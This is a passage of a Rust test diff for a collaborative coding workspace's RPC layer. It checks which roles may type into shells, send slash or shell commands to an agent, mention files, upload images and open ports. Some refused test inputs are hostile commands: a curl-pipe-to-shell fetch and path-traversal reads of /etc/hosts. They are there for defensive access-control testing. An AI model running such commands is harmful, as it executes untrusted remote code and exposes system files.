@@ -632,6 +632,11 @@ async fn participants_read_git_and_disposition_facts_but_never_publish() {
     assert_eq!(facts["repositories"][0]["untrackedFiles"], 1);
     assert_eq!(facts["runningProcesses"], 0);
     assert_eq!(facts["activeTasks"], json!([]));
+    // PRO-33: anyone who may look may read how much disk and memory is left.
+    let resources = call(&f.rpc, &participant, "lifecycle.resources", json!({})).await.unwrap();
+    assert_eq!(resources["v"], 1);
+    #[cfg(unix)]
+    assert!(resources["storage"]["availableBytes"].as_u64().unwrap() <= resources["storage"]["totalBytes"].as_u64().unwrap());
 }
 
 // ---- sharing, presence, notes and leases (PRO-30, saas contract §21) ---------
@@ -654,6 +659,7 @@ impl crate::cloud_agents::AgentOps for OneTab {
             pending_permissions: Vec::new(),
             follow_ups: Vec::new(),
             lease: None,
+            sign_in: None,
             last_seq: 0,
             created: String::new(),
             modified: String::new(),
@@ -687,7 +693,7 @@ fn members(list: Value) -> Option<collab::Members> {
     Some(serde_json::from_value(json!({ "v": 1, "members": list })).unwrap())
 }
 
-const ALL: [&str; 6] = ["pty/1", "fs/1", "session/1", "keys/1", "collab/1", "git/1"];
+const ALL: [&str; 9] = ["pty/1", "fs/1", "session/1", "keys/1", "collab/1", "git/1", "composer/1", "composer/2", "composer/3"];
 
 async fn person(rpc: &Arc<WorkspaceRpc>, device: &str, authority: Authority, user: &str) -> (Arc<Peer>, Notifications, Value) {
     let (peer, events) = Peer::for_user(device.into(), authority, Some(user.into()));
@@ -707,7 +713,8 @@ async fn roles_decide_what_a_participant_reads_types_and_holds() {
     let agents = with_tab(&f);
     f.rpc.set_collaboration(members(json!([
         { "userId": "admin", "role": "manager", "canApprove": true },
-        { "userId": "alice", "role": "driver", "canApprove": false },
+        // A driver types into a terminal only with the approval right (PRO-88).
+        { "userId": "alice", "role": "driver", "canApprove": true },
         { "userId": "bob", "role": "viewer", "canApprove": true },
     ])));
     let (admin, mut admin_events, hello) = person(&f.rpc, "d-admin", Authority::Manage, "admin").await;
@@ -982,6 +989,459 @@ async fn a_key_holder_removed_while_the_runtime_was_down_triggers_a_rotation() {
     let current = reopened.keys.current().unwrap().0;
     restarted.set_collaboration(members(json!([{ "userId": "admin", "role": "manager" }, { "userId": "bob", "role": "viewer" }])));
     assert_eq!(reopened.keys.current().unwrap().0, current);
+}
+
+/// PRO-88: a shell is arbitrary code as the workspace's user, so typing into
+/// one needs what changing the agent's settings needs. A plain driver
+/// watches; an approving viewer still only watches; and a driver whose
+/// approval right is withdrawn loses the terminal they controlled.
+#[tokio::test(flavor = "multi_thread")]
+async fn a_shell_needs_the_approval_right_and_loses_its_controller_when_it_is_withdrawn() {
+    let f = fixture();
+    let list = |erin_approves: bool| {
+        members(json!([
+            { "userId": "admin", "role": "manager" },
+            { "userId": "alice", "role": "driver", "canApprove": false },
+            { "userId": "bob", "role": "viewer", "canApprove": true },
+            { "userId": "erin", "role": "driver", "canApprove": erin_approves },
+        ]))
+    };
+    f.rpc.set_collaboration(list(true));
+    let (admin, mut admin_events, _) = person(&f.rpc, "d-admin", Authority::Manage, "admin").await;
+    let (alice, mut alice_events, _) = person(&f.rpc, "d-alice", Authority::Participate, "alice").await;
+    let (bob, _bob_events, _) = person(&f.rpc, "d-bob", Authority::Participate, "bob").await;
+    let (erin, _erin_events, _) = person(&f.rpc, "d-erin", Authority::Participate, "erin").await;
+    // An admin's phone: a participate attachment of a manager.
+    let (phone, _phone_events, _) = person(&f.rpc, "d-phone", Authority::Participate, "admin").await;
+
+    let created = call(&f.rpc, &admin, "pty.create", json!({ "clientRequestId": "request-shell-1" })).await.unwrap();
+    let pty_id = created["ptyId"].as_str().unwrap().to_string();
+    call(&f.rpc, &admin, "pty.attach", json!({ "ptyId": pty_id })).await.unwrap();
+    // The plain driver watches the shell, and can do nothing else to it.
+    call(&f.rpc, &alice, "pty.attach", json!({ "ptyId": pty_id })).await.unwrap();
+    for (method, params) in [
+        ("pty.control", json!({ "ptyId": pty_id })),
+        ("pty.control", json!({ "ptyId": pty_id, "cols": 100, "rows": 30 })),
+        ("pty.write", json!({ "ptyId": pty_id, "data": "echo plain-driver\n", "seq": 1, "writerId": "a" })),
+        ("pty.resize", json!({ "ptyId": pty_id, "cols": 100, "rows": 30 })),
+    ] {
+        let (refusal, message) = call(&f.rpc, &alice, method, params).await.unwrap_err();
+        assert_eq!(refusal, "forbidden", "{method}");
+        assert!(message.contains("approve permissions"), "{method}: the refusal says what is missing: {message}");
+        assert_eq!(code(call(&f.rpc, &bob, method, json!({ "ptyId": pty_id, "data": "x", "seq": 1, "cols": 80, "rows": 24 })).await), "forbidden", "{method}: an approving viewer");
+    }
+    assert_eq!(call(&f.rpc, &admin, "pty.list", json!({})).await.unwrap()["terminals"][0]["controllerId"], "admin", "nothing moved");
+
+    // A driver who may approve takes it and types; so does a manager's phone.
+    let taken = call(&f.rpc, &erin, "pty.control", json!({ "ptyId": pty_id })).await.unwrap();
+    assert_eq!((taken["control"].as_str(), taken["controllerId"].as_str()), (Some("you"), Some("erin")));
+    assert_eq!(next_event(&mut admin_events, "pty.control").await["controllerId"], "erin");
+    assert_eq!(next_event(&mut alice_events, "pty.control").await["controllerId"], "erin");
+    call(&f.rpc, &erin, "pty.write", json!({ "ptyId": pty_id, "data": "echo approver-$((40+2))\n", "seq": 1, "writerId": "e" })).await.unwrap();
+    output_until(&mut admin_events, "approver-42").await;
+    assert_eq!(call(&f.rpc, &phone, "pty.control", json!({ "ptyId": pty_id })).await.unwrap()["control"], "you");
+    assert_eq!(next_event(&mut admin_events, "pty.control").await["controllerId"], "admin");
+    call(&f.rpc, &erin, "pty.control", json!({ "ptyId": pty_id })).await.unwrap();
+    assert_eq!(next_event(&mut admin_events, "pty.control").await["controllerId"], "erin");
+
+    // Still a driver, no longer an approver: control goes, and the next
+    // write is refused for the missing right, not as `not_controller`.
+    f.rpc.set_collaboration(list(false));
+    let told = next_event(&mut admin_events, "pty.control").await;
+    assert_eq!((told["control"].as_str(), told["controllerId"].clone()), (Some("none"), Value::Null));
+    let (refusal, message) = call(&f.rpc, &erin, "pty.write", json!({ "ptyId": pty_id, "data": "x", "seq": 2, "writerId": "e" })).await.unwrap_err();
+    assert_eq!(refusal, "forbidden");
+    assert!(message.contains("approve permissions"), "{message}");
+    assert_eq!(code(call(&f.rpc, &erin, "pty.control", json!({ "ptyId": pty_id })).await), "forbidden");
+    assert!(tokio::time::timeout(Duration::from_millis(50), erin.closed()).await.is_err(), "a driver stays connected");
+}
+
+/// PRO-88: the live `session.send` applies the mailbox's slash command rule.
+/// (The fixture runs no agents: a send that passed every check is
+/// `unavailable`.)
+#[tokio::test(flavor = "multi_thread")]
+async fn a_plain_drivers_slash_command_is_refused_on_the_live_send_too() {
+    let _home = crate::store::temp_home();
+    let f = fixture();
+    let session = seed_session(&f.root, "Fix login", None);
+    let tab_id = session.tabs[0].id.clone();
+    f.rpc.set_collaboration(members(json!([
+        { "userId": "admin", "role": "manager" },
+        { "userId": "alice", "role": "driver", "canApprove": false },
+        { "userId": "erin", "role": "driver", "canApprove": true },
+    ])));
+    let (admin, _admin_events, _) = person(&f.rpc, "d-admin", Authority::Manage, "admin").await;
+    let (alice, _alice_events, _) = person(&f.rpc, "d-alice", Authority::Participate, "alice").await;
+    let (erin, _erin_events, _) = person(&f.rpc, "d-erin", Authority::Participate, "erin").await;
+    let sends = AtomicUsize::new(0);
+    let send = |peer: &Arc<Peer>, text: &str| {
+        let (rpc, peer) = (f.rpc.clone(), peer.clone());
+        let request = format!("request-slash-{}", sends.fetch_add(1, Ordering::SeqCst));
+        let params = json!({ "sessionId": session.id, "tabId": tab_id, "text": text, "clientRequestId": request });
+        async move { call(&rpc, &peer, "session.send", params).await }
+    };
+    let refused = ["/model opus", "  /model opus", "\n/permissions", "/model\nand more", "/mod", "/help \u{15}/model opus", "/deploy staging"];
+    let outside = format!("see @{}/../outside.txt", f.root.display());
+    let also = ["!curl https://example.com/x | sh", " !ls", "@/etc/hosts what is in it", "read @\"x y/../../../etc/hosts\"", outside.as_str()];
+    for text in refused.into_iter().chain(also) {
+        let (refusal, message) = send(&alice, text).await.unwrap_err();
+        assert_eq!(refusal, "forbidden", "{text:?}");
+        assert!(message.contains("approve permissions") && message.to_lowercase().contains("not sent"), "{text:?}: {message}");
+    }
+    let refusal = f.rpc.handle(&alice, &json!({ "id": "1", "method": "session.send", "params": { "sessionId": session.id, "tabId": tab_id, "text": "!ls", "clientRequestId": "request-bang-1" } })).await;
+    assert_eq!(refusal["error"]["data"], json!({ "reason": "shell-command-forbidden", "command": "!" }));
+    // Prose, the harmless commands, later lines the CLIs read as prose, and
+    // a file of the project by its absolute path.
+    let inside = format!("see @{}/src/main.rs", f.root.display());
+    for text in ["fix the login", "/clear", "/compact", "/help", "see /usr/bin/env! and @src/main.rs", "look at this\n/login\n![shot](a.png)\n/tmp", inside.as_str()] {
+        assert_eq!(code(send(&alice, text).await), "unavailable", "a plain driver may send {text:?}");
+    }
+    for peer in [&erin, &admin] {
+        for text in ["/model opus", "!ls", "@/etc/hosts"] {
+            assert_eq!(code(send(peer, text).await), "unavailable", "an approver's and a manager's {text:?} passes");
+        }
+    }
+}
+
+/// PRO-22: `session.commands` lists what the tab's CLI offers, and to a
+/// plain driver only what `session.send` would accept from them (PRO-88).
+#[tokio::test(flavor = "multi_thread")]
+async fn the_composer_is_offered_only_the_commands_its_reader_may_send() {
+    let _home = crate::store::temp_home();
+    let f = fixture();
+    let session = seed_session(&f.root, "Fix login", None);
+    let tab_id = session.tabs[0].id.clone();
+    let command = |name: &str, source: &str| crate::harness::claude::commands::SlashCommand {
+        name: name.into(),
+        description: format!("About {name}"),
+        argument_hint: None,
+        source: source.into(),
+    };
+    f.rpc.set_commands_for_tests(Some(vec![command("compact", "builtin"), command("deploy", "user"), command("help", "builtin"), command("review", "builtin")]));
+    f.rpc.set_collaboration(members(json!([
+        { "userId": "admin", "role": "manager" },
+        { "userId": "alice", "role": "driver", "canApprove": false },
+        { "userId": "erin", "role": "driver", "canApprove": true },
+        { "userId": "vera", "role": "viewer" },
+    ])));
+    let (admin, _admin_events, _) = person(&f.rpc, "d-admin", Authority::Manage, "admin").await;
+    let (alice, _alice_events, _) = person(&f.rpc, "d-alice", Authority::Participate, "alice").await;
+    let (erin, _erin_events, _) = person(&f.rpc, "d-erin", Authority::Participate, "erin").await;
+    let (vera, _vera_events, _) = person(&f.rpc, "d-vera", Authority::Participate, "vera").await;
+    let params = json!({ "sessionId": session.id, "tabId": tab_id });
+    let names = |listed: &Value| listed["commands"].as_array().unwrap().iter().map(|c| c["name"].as_str().unwrap().to_string()).collect::<Vec<_>>();
+    for peer in [&admin, &erin] {
+        let listed = call(&f.rpc, peer, "session.commands", params.clone()).await.unwrap();
+        assert_eq!(names(&listed), ["compact", "deploy", "help", "review"]);
+        assert_eq!(listed["restricted"], false);
+        assert_eq!(listed["commands"][1], json!({ "name": "deploy", "description": "About deploy", "source": "user" }));
+    }
+    // A plain driver: every command offered is one the live send accepts,
+    // and a project command (which can carry its own tools) is not among them.
+    let listed = call(&f.rpc, &alice, "session.commands", params.clone()).await.unwrap();
+    assert_eq!(listed["restricted"], true);
+    let offered = names(&listed);
+    assert_eq!(offered, ["compact", "help"]);
+    for (index, name) in offered.iter().enumerate() {
+        let send = json!({ "sessionId": session.id, "tabId": tab_id, "text": format!("/{name}"), "clientRequestId": format!("request-offered-{index}") });
+        assert_eq!(code(call(&f.rpc, &alice, "session.send", send).await), "unavailable", "/{name} is offered, so it is not refused");
+    }
+    // A viewer cannot send, and is offered nothing.
+    let listed = call(&f.rpc, &vera, "session.commands", params.clone()).await.unwrap();
+    assert_eq!((names(&listed).len(), listed["restricted"].clone()), (0, json!(true)));
+    assert_eq!(code(call(&f.rpc, &alice, "session.commands", json!({ "sessionId": session.id, "tabId": "tab-nope" })).await), "not_found");
+    // Withdrawn: the next reading is the narrower list.
+    f.rpc.set_collaboration(members(json!([
+        { "userId": "admin", "role": "manager" },
+        { "userId": "erin", "role": "driver", "canApprove": false },
+    ])));
+    let listed = call(&f.rpc, &erin, "session.commands", params).await.unwrap();
+    assert_eq!((listed["restricted"].clone(), names(&listed).contains(&"deploy".to_string())), (json!(true), false));
+}
+
+/// A CLI that did not answer is an error, not "this agent has no commands".
+#[tokio::test(flavor = "multi_thread")]
+async fn a_command_list_that_could_not_be_read_is_an_error_not_an_empty_list() {
+    let _home = crate::store::temp_home();
+    let f = fixture();
+    let session = seed_session(&f.root, "Fix login", None);
+    let params = json!({ "sessionId": session.id, "tabId": session.tabs[0].id });
+    f.rpc.set_collaboration(members(json!([{ "userId": "admin", "role": "manager" }, { "userId": "vera", "role": "viewer" }])));
+    let (admin, _admin_events, _) = person(&f.rpc, "d-admin", Authority::Manage, "admin").await;
+    let (vera, _vera_events, _) = person(&f.rpc, "d-vera", Authority::Participate, "vera").await;
+    f.rpc.set_commands_for_tests(None);
+    assert_eq!(code(call(&f.rpc, &admin, "session.commands", params.clone()).await), "unavailable");
+    // Someone who is offered nothing is not asked of the CLI at all.
+    assert_eq!(call(&f.rpc, &vera, "session.commands", params.clone()).await.unwrap()["commands"], json!([]));
+    f.rpc.set_commands_for_tests(Some(Vec::new()));
+    assert_eq!(call(&f.rpc, &admin, "session.commands", params).await.unwrap()["commands"], json!([]));
+}
+
+/// PRO-22: `session.files` finds the session's files by name for the
+/// composer's `@` list, for whoever may see the session.
+#[tokio::test(flavor = "multi_thread")]
+async fn the_composer_finds_the_sessions_files_by_name() {
+    let _home = crate::store::temp_home();
+    let f = fixture();
+    std::fs::create_dir_all(f.root.join("src/auth")).unwrap();
+    std::fs::write(f.root.join("src/auth/login.rs"), "secret contents").unwrap();
+    std::fs::write(f.root.join("src/main.rs"), "").unwrap();
+    std::fs::write(f.root.join("README.md"), "").unwrap();
+    let session = seed_session(&f.root, "Fix login", None);
+    f.rpc.set_collaboration(members(json!([
+        { "userId": "admin", "role": "manager" },
+        { "userId": "alice", "role": "driver", "canApprove": false },
+        { "userId": "nora", "role": "none" },
+    ])));
+    let (admin, _admin_events, _) = person(&f.rpc, "d-admin", Authority::Manage, "admin").await;
+    let (alice, _alice_events, _) = person(&f.rpc, "d-alice", Authority::Participate, "alice").await;
+    let (nora, _nora_events, _) = person(&f.rpc, "d-nora", Authority::Participate, "nora").await;
+    let paths = |found: &Value| found["files"].as_array().unwrap().iter().map(|hit| hit["path"].as_str().unwrap().to_string()).collect::<Vec<_>>();
+    for peer in [&admin, &alice] {
+        let found = call(&f.rpc, peer, "session.files", json!({ "sessionId": session.id, "query": "login" })).await.unwrap();
+        assert_eq!(paths(&found), ["src/auth/login.rs"]);
+        assert_eq!(found["files"][0]["name"], "login.rs");
+        assert!(!found.to_string().contains("secret contents"), "names only");
+    }
+    // A bare `@`: the shallowest files first, and no more than asked for.
+    let found = call(&f.rpc, &alice, "session.files", json!({ "sessionId": session.id, "query": "", "limit": 2 })).await.unwrap();
+    assert_eq!(paths(&found), ["README.md", "src/main.rs"]);
+    // What a plain driver is offered is a file of the project: mentioning it is not refused.
+    let send = json!({ "sessionId": session.id, "tabId": session.tabs[0].id, "text": "read @src/auth/login.rs", "clientRequestId": "request-mention-1" });
+    assert_eq!(code(call(&f.rpc, &alice, "session.send", send).await), "unavailable");
+    assert_eq!(code(call(&f.rpc, &alice, "session.files", json!({ "sessionId": session.id, "query": "x".repeat(401) })).await), "invalid_params");
+    // Someone the workspace is not shared with is refused: no file names.
+    assert_eq!(code(call(&f.rpc, &nora, "session.files", json!({ "sessionId": session.id, "query": "login" })).await), "forbidden");
+}
+
+/// PRO-22: `session.attach` takes an image in parts from someone who may
+/// send, keeps it for their message only, and the live send names it.
+#[tokio::test(flavor = "multi_thread")]
+async fn an_image_is_uploaded_in_parts_by_someone_who_may_send_and_named_by_their_message() {
+    let _home = crate::store::temp_home();
+    let f = fixture();
+    let agents = with_tab(&f);
+    let session = seed_session(&f.root, "Fix login", None);
+    let tab_id = session.tabs[0].id.clone();
+    f.rpc.set_collaboration(members(json!([
+        { "userId": "admin", "role": "manager" },
+        { "userId": "alice", "role": "driver", "canApprove": false },
+        { "userId": "bob", "role": "driver", "canApprove": false },
+        { "userId": "vera", "role": "viewer" },
+    ])));
+    let (alice, _alice_events, _) = person(&f.rpc, "d-alice", Authority::Participate, "alice").await;
+    let (bob, _bob_events, _) = person(&f.rpc, "d-bob", Authority::Participate, "bob").await;
+    let (vera, _vera_events, _) = person(&f.rpc, "d-vera", Authority::Participate, "vera").await;
+    let requests = AtomicUsize::new(0);
+    let part = |peer: &Arc<Peer>, id: &str, offset: u64, bytes: &[u8], last: bool, media_type: &str| {
+        let (rpc, peer) = (f.rpc.clone(), peer.clone());
+        let params = json!({
+            "sessionId": session.id, "tabId": tab_id, "attachmentId": id, "mediaType": media_type, "name": "shot.png",
+            "offset": offset, "data": STANDARD.encode(bytes), "last": last,
+            "clientRequestId": format!("request-attach-{}", requests.fetch_add(1, Ordering::SeqCst)),
+        });
+        async move { call(&rpc, &peer, "session.attach", params).await }
+    };
+    // A plain driver may attach: an image changes nothing about what the agent may do.
+    assert_eq!(part(&alice, "attach-0001", 0, b"abc", false, "image/png").await.unwrap()["size"], 3);
+    // The answer to a part was lost and it is sent again under a new request: nothing is written twice.
+    assert_eq!(part(&alice, "attach-0001", 0, b"abc", false, "image/png").await.unwrap()["size"], 3);
+    let done = part(&alice, "attach-0001", 3, b"def", true, "image/png").await.unwrap();
+    assert_eq!((done["size"].clone(), done["complete"].clone()), (json!(6), json!(true)));
+    assert_eq!(agents.attachments.load("alice", &["attach-0001".into()]).unwrap()[0].data, "YWJjZGVm");
+    // Not an image, not a driver, and somebody else's upload.
+    assert_eq!(code(part(&alice, "attach-0002", 0, b"<html>", true, "text/html").await), "invalid_params");
+    assert_eq!(code(part(&vera, "attach-0003", 0, b"abc", true, "image/png").await), "forbidden");
+    assert_eq!(code(part(&bob, "attach-0001", 6, b"ghi", true, "image/png").await), "invalid_params");
+    // It is not a file of the workspace: the tree, Git and the agent never see it.
+    assert!(!walk_names(&f.root).iter().any(|name| name.contains("attach-0001")));
+    // The live send: bob cannot name alice's upload; alice's own passes every check
+    // (the fixture runs no agent, so it ends `unavailable`) and is then done with.
+    let send = |peer: &Arc<Peer>, request: &str| {
+        let (rpc, peer) = (f.rpc.clone(), peer.clone());
+        let params = json!({ "sessionId": session.id, "tabId": tab_id, "text": "what is this?", "images": [{ "id": "attach-0001" }], "clientRequestId": request });
+        async move { rpc.handle(&peer, &json!({ "id": "1", "method": "session.send", "params": params })).await }
+    };
+    let refused = send(&bob, "request-image-send-1").await;
+    assert_eq!((refused["error"]["code"].clone(), refused["error"]["data"]["reason"].clone()), (json!("invalid_params"), json!("attachment-missing")));
+    assert_eq!(send(&alice, "request-image-send-2").await["error"]["code"], "unavailable");
+    assert!(agents.attachments.load("alice", &["attach-0001".into()]).is_err());
+}
+
+/// Every file name under `root`.
+fn walk_names(root: &Path) -> Vec<String> {
+    let mut names = Vec::new();
+    let mut pending = vec![root.to_path_buf()];
+    while let Some(dir) = pending.pop() {
+        for entry in std::fs::read_dir(&dir).into_iter().flatten().flatten() {
+            names.push(entry.file_name().to_string_lossy().into_owned());
+            if entry.path().is_dir() {
+                pending.push(entry.path());
+            }
+        }
+    }
+    names
+}
+
+/// One tab whose turn is running.
+struct BusyTab;
+
+impl crate::cloud_agents::AgentOps for BusyTab {
+    fn tabs(&self) -> Vec<crate::cloud_agents::AgentTabInfo> {
+        OneTab.tabs()
+    }
+    fn busy(&self, _: &str, _: &str) -> bool {
+        true
+    }
+    fn send(&self, _: &str, _: &str, _: &str) -> anyhow::Result<()> {
+        panic!("the live send goes through the session manager")
+    }
+    fn stop(&self, _: &str, _: &str) -> anyhow::Result<()> {
+        Ok(())
+    }
+    fn respond(&self, _: &str, _: &str, _: &str, _: &str) -> Result<(), crate::cloud_agents::DecisionError> {
+        Ok(())
+    }
+    fn answer(&self, _: &str, _: &str, _: &str, _: HashMap<String, String>) -> Result<(), crate::cloud_agents::DecisionError> {
+        Ok(())
+    }
+    fn configure(&self, _: &str, _: &str, _: &crate::cloud_agents::Settings) -> anyhow::Result<()> {
+        Ok(())
+    }
+    fn note(&self, _: &str, _: &str, _: &str) {}
+    fn events(&self, _: &str, _: &str) -> anyhow::Result<Vec<Value>> {
+        Ok(Vec::new())
+    }
+}
+
+/// While a turn runs, the live `session.send` queues prose (a mention of any
+/// file included) for the people who may send it, and refuses to queue only
+/// a slash or `!` command: nothing re-checks that queue if its sender loses
+/// the right before the turn ends.
+#[tokio::test(flavor = "multi_thread")]
+async fn the_live_send_queues_prose_but_never_a_command_behind_a_running_turn() {
+    let _home = crate::store::temp_home();
+    let f = fixture();
+    let agents = crate::cloud_agents::CloudAgents::open(&f._dir.path().join("agents"), Arc::new(BusyTab), None, None, 7).unwrap();
+    f.rpc.set_agents(agents);
+    let session = seed_session(&f.root, "Fix login", None);
+    let tab_id = session.tabs[0].id.clone();
+    f.rpc.set_collaboration(members(json!([
+        { "userId": "admin", "role": "manager" },
+        { "userId": "alice", "role": "driver", "canApprove": false },
+        { "userId": "erin", "role": "driver", "canApprove": true },
+    ])));
+    let (admin, _admin_events, _) = person(&f.rpc, "d-admin", Authority::Manage, "admin").await;
+    let (alice, _alice_events, _) = person(&f.rpc, "d-alice", Authority::Participate, "alice").await;
+    let (erin, _erin_events, _) = person(&f.rpc, "d-erin", Authority::Participate, "erin").await;
+    let sends = AtomicUsize::new(0);
+    let send = |peer: &Arc<Peer>, text: &str| {
+        let (rpc, peer) = (f.rpc.clone(), peer.clone());
+        let request = format!("request-busy-{}", sends.fetch_add(1, Ordering::SeqCst));
+        let params = json!({ "id": "1", "method": "session.send", "params": { "sessionId": session.id, "tabId": tab_id, "text": text, "clientRequestId": request } });
+        async move { rpc.handle(&peer, &params).await["error"].clone() }
+    };
+    for peer in [&erin, &admin] {
+        for text in ["/model opus", "!ls", "  /clear", "/compact"] {
+            let error = send(peer, text).await;
+            assert_eq!((error["code"].as_str(), error["data"]["reason"].as_str()), (Some("conflict"), Some("command-not-queued")), "{text:?}");
+            assert!(error["message"].as_str().unwrap().starts_with("A turn is running"), "{error}");
+        }
+        // Prose is queued as before (this fixture has no session manager:
+        // `unavailable` is a send that passed every check).
+        for text in ["fix the login", "and read @/etc/hosts too", "the docs say\n/model opus\n!ls"] {
+            assert_eq!(send(peer, text).await["code"], "unavailable", "{text:?}");
+        }
+    }
+    // A plain driver's command is refused for the right, not for the turn.
+    for (text, reason) in [("/model opus", "slash-command-forbidden"), ("!ls", "shell-command-forbidden"), ("read @/etc/hosts", "file-mention-forbidden")] {
+        let error = send(&alice, text).await;
+        assert_eq!((error["code"].as_str(), error["data"]["reason"].as_str()), (Some("forbidden"), Some(reason)), "{text:?}");
+    }
+    assert_eq!(send(&alice, "/clear").await["data"]["reason"], "command-not-queued", "an allowed command is still a command");
+    assert_eq!(send(&alice, "fix the login").await["code"], "unavailable");
+}
+
+/// PRO-88, after #255: a shell and an agent's own terminal answer to one
+/// rule (`Access::can_configure`), on each of the three calls that type,
+/// size or take a terminal, and when the right is withdrawn.
+#[tokio::test(flavor = "multi_thread")]
+async fn shells_and_agent_terminals_need_the_same_right_on_every_call() {
+    let f = fixture();
+    with_tab(&f);
+    // admin: manager. alice: approving driver. erin: plain driver. bob:
+    // approving viewer. carol: not shared.
+    shared(&f);
+    start_agent_cli(&f);
+    let (admin, mut admin_events) = agent_person(&f.rpc, "d-admin", Authority::Manage, "admin").await;
+    let (alice, _alice_events) = agent_person(&f.rpc, "d-alice", Authority::Participate, "alice").await;
+    let (erin, _erin_events) = agent_person(&f.rpc, "d-erin", Authority::Participate, "erin").await;
+    let (bob, _bob_events) = agent_person(&f.rpc, "d-bob", Authority::Participate, "bob").await;
+    let (carol, _carol_events) = agent_person(&f.rpc, "d-carol", Authority::Participate, "carol").await;
+    let created = call(&f.rpc, &admin, "pty.create", json!({ "clientRequestId": "request-both-1" })).await.unwrap();
+    let shell = created["ptyId"].as_str().unwrap().to_string();
+    call(&f.rpc, &admin, "pty.attach", json!({ "ptyId": shell })).await.unwrap();
+    call(&f.rpc, &admin, "pty.attach", json!({ "ptyId": AGENT_TERMINAL })).await.unwrap();
+
+    let calls = |pty: &str| {
+        [
+            ("pty.write", json!({ "ptyId": pty, "data": "x", "seq": 1, "writerId": "w" })),
+            ("pty.resize", json!({ "ptyId": pty, "cols": 90, "rows": 20 })),
+            ("pty.control", json!({ "ptyId": pty })),
+        ]
+    };
+    for pty in [shell.as_str(), AGENT_TERMINAL] {
+        for (method, params) in calls(pty) {
+            // The plain driver and the approving viewer are refused for
+            // their access, the member it is not shared with outright.
+            let refused = f.rpc.handle(&erin, &json!({ "id": "1", "method": method, "params": params })).await;
+            assert_eq!(
+                (refused["error"]["code"].as_str(), refused["error"]["data"]["needs"].as_str()),
+                (Some("forbidden"), Some("canApprove")),
+                "{pty} {method}: a plain driver"
+            );
+            assert_eq!(code(call(&f.rpc, &bob, method, params.clone()).await), "forbidden", "{pty} {method}: an approving viewer");
+            assert_eq!(code(call(&f.rpc, &carol, method, params.clone()).await), "forbidden", "{pty} {method}: not shared");
+        }
+        // Nothing moved: the approving driver is refused only for not
+        // controlling it, takes it, and then types and sizes it.
+        assert_eq!(code(call(&f.rpc, &alice, "pty.write", calls(pty)[0].1.clone()).await), "not_controller", "{pty}");
+        assert_eq!(call(&f.rpc, &alice, "pty.control", json!({ "ptyId": pty })).await.unwrap()["control"], "you", "{pty}");
+        assert_eq!(next_event(&mut admin_events, "pty.control").await["controllerId"], "alice", "{pty}");
+        for (method, params) in &calls(pty)[..2] {
+            call(&f.rpc, &alice, method, params.clone()).await.unwrap_or_else(|error| panic!("{pty} {method}: {error:?}"));
+        }
+    }
+
+    // Alice keeps driving but may no longer approve: she loses the shell and
+    // the agent's terminal alike, and every call is refused for the right.
+    f.rpc.set_collaboration(members(json!([
+        { "userId": "admin", "role": "manager", "canApprove": true },
+        { "userId": "alice", "role": "driver", "canApprove": false },
+        { "userId": "erin", "role": "driver", "canApprove": false },
+        { "userId": "bob", "role": "viewer", "canApprove": true },
+    ])));
+    let mut freed = Vec::new();
+    for _ in 0..2 {
+        let told = next_event(&mut admin_events, "pty.control").await;
+        assert_eq!((told["control"].as_str(), told["controllerId"].clone()), (Some("none"), Value::Null));
+        freed.push(told["ptyId"].as_str().unwrap().to_string());
+    }
+    freed.sort();
+    let mut both = vec![shell.clone(), AGENT_TERMINAL.to_string()];
+    both.sort();
+    assert_eq!(freed, both);
+    for pty in [shell.as_str(), AGENT_TERMINAL] {
+        for (method, mut params) in calls(pty) {
+            params["seq"] = json!(2);
+            let refused = f.rpc.handle(&alice, &json!({ "id": "1", "method": method, "params": params })).await;
+            assert_eq!(
+                (refused["error"]["code"].as_str(), refused["error"]["data"]["needs"].as_str()),
+                (Some("forbidden"), Some("canApprove")),
+                "{pty} {method}: after the right is withdrawn"
+            );
+        }
+    }
 }
 
 // ---- CS-12: agents/1, session/2, pty/2 ---------------------------------------
@@ -1701,7 +2161,7 @@ async fn withdrawing_approval_rights_takes_the_agent_terminal_and_frees_the_tab(
     call(&f.rpc, &alice, "pty.control", json!({ "ptyId": AGENT_TERMINAL })).await.unwrap();
     assert_eq!(next_event(&mut bob_events, "pty.control").await["controllerId"], "alice");
     call(&f.rpc, &alice, "pty.write", json!({ "ptyId": AGENT_TERMINAL, "data": "\n", "seq": 1, "writerId": "w" })).await.unwrap();
-    // She also controls a shell, which approval rights have nothing to do with.
+    // She also controls a shell, which needs the same right (PRO-88).
     let shell = call(&f.rpc, &admin, "pty.create", json!({ "clientRequestId": "request-approve-1" })).await.unwrap()["ptyId"].as_str().unwrap().to_string();
     call(&f.rpc, &alice, "pty.control", json!({ "ptyId": shell })).await.unwrap();
 
@@ -1716,8 +2176,9 @@ async fn withdrawing_approval_rights_takes_the_agent_terminal_and_frees_the_tab(
     assert_eq!(state["leases"], json!([]), "the tab she held by typing is free again");
     let attached = call(&f.rpc, &alice, "pty.attach", json!({ "ptyId": AGENT_TERMINAL })).await.unwrap();
     assert_eq!(attached["control"], "none");
-    // Still a driver: the shell stays hers.
-    assert_eq!(call(&f.rpc, &alice, "pty.attach", json!({ "ptyId": shell })).await.unwrap()["control"], "you");
+    // Still a driver, but a shell is no more hers than the agent's terminal.
+    assert_eq!(call(&f.rpc, &alice, "pty.attach", json!({ "ptyId": shell })).await.unwrap()["control"], "none");
+    assert_eq!(code(call(&f.rpc, &alice, "pty.control", json!({ "ptyId": shell })).await), "forbidden");
 }
 
 #[tokio::test(flavor = "multi_thread")]
@@ -1814,4 +2275,283 @@ async fn a_viewer_added_later_is_replayed_what_the_terminal_kept() {
     // Told where the replay ends, so the client's terminal answers no query in it.
     assert!(attached["replayEnd"].as_u64().unwrap() >= end);
     assert_eq!(attached["offset"], 0);
+}
+
+// ---- port streams (PRO-28) ------------------------------------------------
+
+use base64::engine::general_purpose::STANDARD as B64;
+use tokio::io::{AsyncReadExt, AsyncWriteExt};
+
+async fn ports_peer(rpc: &Arc<WorkspaceRpc>, device: &str, authority: Authority, user: Option<&str>) -> (Arc<Peer>, Notifications) {
+    let (peer, events) = Peer::for_user(device.into(), authority, user.map(str::to_string));
+    call(rpc, &peer, "rpc.hello", json!({ "protocol": PROTOCOL, "want": ["ports/1", "pty/1", "collab/1"] })).await.unwrap();
+    (peer, events)
+}
+
+/// `ports.open` as the host answers it: the answer first, then the stream's data.
+async fn open_port(rpc: &Arc<WorkspaceRpc>, peer: &Arc<Peer>, port: u16) -> Value {
+    let opened = call(rpc, peer, "ports.open", json!({ "port": port })).await.unwrap();
+    rpc.ports.start(peer, opened["streamId"].as_str().unwrap());
